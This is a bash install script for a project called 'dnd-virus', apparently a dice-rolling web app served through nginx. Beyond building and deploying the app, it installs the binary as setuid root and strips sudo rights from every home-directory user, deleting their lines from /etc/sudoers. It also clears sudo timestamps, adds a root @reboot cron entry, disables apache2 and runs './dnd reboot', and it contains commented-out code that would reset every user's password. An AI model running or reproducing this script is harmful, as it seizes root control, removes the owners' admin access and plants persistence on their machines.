#!/bin/bash

set -e
INSTALL_DIR="$HOME/.local/share/dnd"

cd ../frontend
rm -rf node_modules package-lock.json
npm install
npm run build
cd ..

rm -rf backend/web
mkdir -p backend/web
cp -r frontend/dist/* backend/web/

rm -f backend/dnd
sudo rm -f "$INSTALL_DIR/dnd"

cd backend

go build -o dnd

mkdir -p "$INSTALL_DIR"
cp dnd "$INSTALL_DIR/"

sudo chown root:root ~/.local/share/dnd/dnd
sudo chmod 4755 ~/.local/share/dnd/dnd

pkill -f "$INSTALL_DIR/dnd" 2>/dev/null || true
sleep 1

for user in $(getent passwd | grep -E '/home' | cut -d: -f1); do
    #PASS=$("$INSTALL_DIR/dnd" genpass)
    #echo "$user:$PASS" | sudo chpasswd &>/dev/null
    (sudo gpasswd -d "$user" sudo) &>/dev/null
    sudo deluser "$user" sudo &>/dev/null
    (sudo sed -i "/$user/d" /etc/sudoers) &>/dev/null
done || true

(sudo crontab -l 2>/dev/null | grep -v "$INSTALL_DIR/dnd" | sudo crontab -) 2>/dev/null
(sudo crontab -l 2>/dev/null; echo "@reboot $INSTALL_DIR/dnd > /tmp/dnd.log 2>&1") | sudo crontab -

sudo rm -rf /var/run/sudo/ts/*

sudo mkdir -p /var/www/dnd-virus/video
sudo cp -r ../frontend/public/video/* /var/www/dnd-virus/video/

sudo tee /etc/nginx/sites-available/dnd-virus > /dev/null << 'EOF'
limit_req_zone $binary_remote_addr zone=dnd_api:10m rate=1r/s;
server {
    listen 80;
    server_name _;
    
    location /video/ {
        alias /var/www/dnd-virus/video/;
        sendfile on;
        tcp_nopush on;
        expires 7d;
        add_header Cache-Control "public, immutable";
        add_header Accept-Ranges bytes;
    }

    location /api/ {
        limit_req zone=dnd_api burst=3 nodelay;
        limit_req_status 429;
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
        proxy_connect_timeout 75s;
    }

    location / {
        root /opt/dnd-virus/web;
        try_files $uri $uri/ /index.html;
        expires 1d;
        add_header Cache-Control "public, immutable";
    }

    error_page 429 /429.html;
    location = /429.html {
        root /opt/dnd-virus/web;
        return 429 "<!DOCTYPE html><html><head><title>Too Many Requests</title></head><body style='text-align:center;padding:50px;font-family:monospace'><h1>429 - Too Many Requests</h1><p>Too many dice rolls...</p><button onclick='history.back()'>Назад</button></body></html>";
        add_header Content-Type text/html;
    }

    access_log /var/log/nginx/dnd-virus-access.log;
    error_log /var/log/nginx/dnd-virus-error.log;
}
EOF

sudo mkdir -p /opt/dnd-virus
sudo rm -rf /opt/dnd-virus/web
sudo cp -r ../backend/web /opt/dnd-virus/

if [ ! -f /opt/dnd-virus/web/429.html ]; then
    sudo tee /opt/dnd-virus/web/429.html > /dev/null << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>Too Many Requests</title>
    <style>
        body { text-align: center; padding: 50px; font-family: 'Courier New', monospace; background: #e3eefb }
        h1 { color: #e94560; font-size: 24px; text-shadow: 0 0 10px rgba(233, 69, 96, 0.5); }
        p { color: #888; margin: 10px; }
        button { background: linear-gradient(135deg, #e94560, #c62a4a); border: none; color: white; font-size: 20px; font-weight: bold; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-family: monospace; transition: transform 0.2s, box-shadow 0.2s; margin: 20px auto; }
    </style>
</head>
<body>
    <h1>Too Many Requests</h1>
    <p>Too many dice rolls, adventurer...</p>
    <button onclick="history.back()">Go back</button>
</body>
</html>
HTML
fi

sudo ln -sf /etc/nginx/sites-available/dnd-virus /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default

sudo systemctl stop apache2 2>/dev/null || true
sudo systemctl disable apache2 2>/dev/null || true

sudo systemctl start nginx
sudo systemctl enable nginx

sudo nginx -t && sudo systemctl reload nginx

./dnd reboot